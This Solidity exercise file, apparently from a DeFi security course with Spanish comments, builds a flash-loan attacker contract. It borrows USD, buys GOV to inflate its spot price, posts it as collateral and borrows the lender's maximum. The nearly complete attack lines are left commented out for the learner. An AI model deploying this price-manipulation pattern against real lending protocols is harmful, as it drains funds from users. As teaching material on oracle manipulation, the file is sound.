// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Token} from "./Token.sol";
import {Pool} from "./Pool.sol";
import {Lender} from "./Lender.sol";

// ¿Qué? El atacante: pide un flash loan de USD, compra GOV en el pool para inflar su precio,
//   deja ese GOV de garantía en el prestamista, pide prestado todo lo que le dejan y devuelve
//   el flash loan. Lo que sobra es suyo.
// ¿Para qué? Ver que un precio al contado se compra, y que con un flash loan no hace falta
//   tener capital para comprarlo.
contract FlashAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    Token public immutable USD;
    IERC20 public immutable GOV;
    Pool public immutable POOL;
    Lender public immutable LENDER;
    address public immutable OWNER;

    error UntrustedLender(address caller);
    error UntrustedInitiator(address initiator);

    constructor(Token usd, IERC20 gov, Pool pool, Lender lender) {
        USD = usd;
        GOV = gov;
        POOL = pool;
        LENDER = lender;
        OWNER = msg.sender;
    }

    /// @notice Pide `loan` USD prestados y envía a quien desplegó el atacante lo que sobre.
    function attack(uint256 loan) external {
        USD.flashLoan(this, address(USD), loan, "");
        IERC20(USD).safeTransfer(OWNER, USD.balanceOf(address(this)));
    }

    /// @notice El token llama aquí con los `amount` USD ya en el saldo de este contrato.
    function onFlashLoan(address initiator, address, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        // PASO 3: aceptar solo préstamos del token y pedidos por este contrato.
        // Descomenta las líneas que empiezan con `//> `.
        //> if (msg.sender != address(USD)) revert UntrustedLender(msg.sender);
        //> if (initiator != address(this)) revert UntrustedInitiator(initiator);

        // PASO 2: el ataque, con el dinero prestado.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 2");
        //> IERC20(USD).forceApprove(address(POOL), amount);
        //> uint256 gov = POOL.swap(USD, amount);
        //> GOV.forceApprove(address(LENDER), gov);
        //> LENDER.borrow(gov, LENDER.maxDebt(gov));
        //> // El token cobra quemando `amount + fee` de este contrato: necesita la allowance.
        //> IERC20(USD).forceApprove(address(USD), amount + fee);
        //> return CALLBACK_SUCCESS;
    }
}
